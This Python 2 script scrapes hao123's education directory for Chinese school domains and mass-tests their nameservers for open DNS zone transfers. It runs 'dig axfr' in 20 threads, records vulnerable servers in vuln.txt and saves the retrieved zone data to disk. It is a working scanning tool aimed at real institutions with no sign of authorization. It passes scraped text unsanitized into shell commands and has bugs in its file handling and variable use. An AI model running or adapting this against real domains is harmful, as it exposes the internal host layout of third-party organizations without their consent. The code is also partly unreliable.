# coding:utf-8
import os
import re
import threading
import Queue
import requests


q = Queue.Queue()
lock = threading.Lock()


def get_provices_urls():
    hao123_url = "http://www.hao123.com/edu/"
    html_source = requests.get(url=hao123_url).content
    # print(html_source)
    provice_url = re.findall(
        r'<a href="http://www\.hao123\.com/eduhtm/(\w*).htm" target="_blank">', html_source)
    # print(provice_url)

    with open("provices.txt", 'w') as fo:
        for i in provice_url:
            fo.write(
                "http://www.hao123.com/eduhtm/{area}.htm".format(area=i)+"\n")


def get_edu_schools():
    with open('provices.txt', 'r') as fo:
        for area_url in fo.readlines():
            html_source = requests.get(area_url.strip()).content
            # print(html_source)
            school_urls = re.findall(
                r'<a href="(http://www\.\S*/)">', html_source)
            # print(school_urls)
            with open("schools.txt", "a+") as fw:
                for i in school_urls:
                    fw.write(i+'\n')


def get_Queue():
    global q
    with open("schools.txt", 'a+') as fo:
        for school in fo.readlines():
            school_domain = school.rstrip('/\n').replace("http://www.", '')
            # print(school_domain)
            q.put(school_domain)


def test_school_dns():
    while not q.empty():
        domain = q.get()
        dns_servers = os.popen(
            "dig ns {domain} +short".format(domain=domain)).readlines()
        # print(dns_servers)
        for dns_server in dns_servers:
            if len(dns_server) > 5:
                cmd = "dig @{dns} axfr {domain} +short".format(
                    dns=dns_server.strip(), domain=domain)
                dig_content = os.popen(cmd).read()
                # print(dig_content)
                print(cmd)
            if dig_content.find('Transfer failed') < 0\
                    and dig_content.find('connection timed out') < 0\
                    and dig_content.find('XFR size') > 0:
                lock.acquire()
                print("[FOUND]@{dns}  {domain}".format(
                    dns=dns_server, domain=domain))
                with open('vuln.txt', 'a+') as fo:
                    fo.write(dns_server.ljust(30)+domain+'\n')
                lock.release()
                with open('DNS2/' + domain + '.txt', 'w') as f:
                    f.write(dig_content)


def start():
    get_Queue()
    threads = []
    thread_num = 20
    for i in xrange(thread_num):
        t = threading.Thread(target=test_school_dns)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == '__main__':
    start()
